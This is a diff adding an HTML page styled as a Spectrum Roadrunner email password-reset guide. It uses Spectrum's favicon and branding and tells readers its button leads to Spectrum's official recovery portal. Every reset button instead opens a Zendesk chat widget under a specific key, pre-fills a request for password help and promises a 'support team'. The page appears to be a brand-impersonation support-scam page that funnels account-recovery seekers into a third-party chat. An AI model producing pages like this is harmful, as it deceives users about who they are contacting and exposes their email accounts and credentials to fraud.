@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reset Roadrunner Email Password | Spectrum Account Recovery</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://www.spectrum.com/favicon.ico" type="image/x-icon">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --spectrum-blue: #0047ba;
+            --spectrum-orange: #ff8c00;
+            --light-gray: #f5f5f5;
+            --dark-gray: #333;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--dark-gray);
+            background: var(--light-gray);
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px 0;
+        }
+        h1 {
+            color: var(--spectrum-blue);
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 1.1rem;
+        }
+        .reset-box {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+        }
+        .btn {
+            display: inline-block;
+            background: var(--spectrum-orange);
+            color: white;
+            padding: 12px 25px;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: 600;
+            margin: 15px 0;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #e67e00;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .step {
+            margin-bottom: 25px;
+            padding-left: 40px;
+            position: relative;
+        }
+        .step-number {
+            position: absolute;
+            left: 0;
+            width: 30px;
+            height: 30px;
+            background: var(--spectrum-blue);
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+        }
+        .alert {
+            background: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .support-section {
+            background: #f0f7ff;
+            padding: 20px;
+            border-radius: 8px;
+        }
+    </style>
+    
+    <!-- Zendesk Widget (initially disabled) -->
+    <script>
+        function loadZendesk() {
+            // Only load Zendesk when needed
+            const script = document.createElement('script');
+            script.id = 'ze-snippet';
+            script.src = 'https://static.zdassets.com/ekr/snippet.js?key=7668c976-0fb7-47ee-8740-3e9115bdb10f';
+            document.body.appendChild(script);
+            
+            // Set timeout to ensure widget loads before opening
+            setTimeout(() => {
+                if (typeof zE === 'function') {
+                    zE('webWidget', 'open');
+                    zE('webWidget', 'chat:send', 'I need help resetting my Roadrunner email password');
+                } else {
+                    window.location.href = 'https://www.spectrum.net/login/#/forgotUsername/';
+                }
+            }, 1000);
+            
+            return false; // Prevent default link behavior
+        }
+    </script>
+</head>
+<body>
+    <header>
+        <h1>Reset Your Roadrunner Email Password</h1>
+        <p class="subtitle">Recover access to your Spectrum Webmail account</p>
+        <!-- Modified reset button to trigger Zendesk -->
+        <a href="#" onclick="return loadZendesk()" class="btn">
+            <i class="fas fa-key"></i> Reset Password Now
+        </a>
+    </header>
+
+    <div class="reset-box">
+        <h2>Password Reset Instructions</h2>
+        
+        <div class="step">
+            <div class="step-number">1</div>
+            <h3>Visit the Password Reset Page</h3>
+            <p>Go to Spectrum's official password recovery portal:</p>
+            <a href="#" onclick="return loadZendesk()" class="btn" style="display: inline-block; padding: 10px 15px; font-size: 0.9rem;">
+                Click to Reset Password
+            </a>
+        </div>
+        
+        <div class="step">
+            <div class="step-number">2</div>
+            <h3>Verify Your Account</h3>
+            <p>You'll need to provide either:</p>
+            <ul>
+                <li>Your Roadrunner email address</li>
+                <li>Spectrum account username</li>
+                <li>Registered phone number</li>
+            </ul>
+        </div>
+        
+        <div class="step">
+            <div class="step-number">3</div>
+            <h3>Complete Identity Verification</h3>
+            <p>Choose one of these verification methods:</p>
+            <ul>
+                <li>Email verification code</li>
+                <li>SMS text message</li>
+                <li>Answer security questions</li>
+            </ul>
+        </div>
+        
+        <div class="step">
+            <div class="step-number">4</div>
+            <h3>Create a Strong New Password</h3>
+            <p>Your new password must:</p>
+            <ul>
+                <li>Be at least 8 characters long</li>
+                <li>Include uppercase and lowercase letters</li>
+                <li>Contain at least one number</li>
+                <li>Not match your previous passwords</li>
+            </ul>
+        </div>
+        
+        <div class="alert">
+            <h3><i class="fas fa-exclamation-triangle"></i> Security Notice</h3>
+            <p>Spectrum will never ask for your password via email or phone. Always verify you're on the official Spectrum website before entering your credentials.</p>
+        </div>
+    </div>
+
+    <div class="support-section">
+        <h2>Need Additional Help?</h2>
+        <p>If you're having trouble resetting your password, our support team can guide you through the process when you click the reset button above.</p>
+    </div>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="#" onclick="return loadZendesk()" class="btn">
+            <i class="fas fa-key"></i> Start Password Reset
+        </a>
+    </div>
+</body>
+</html>
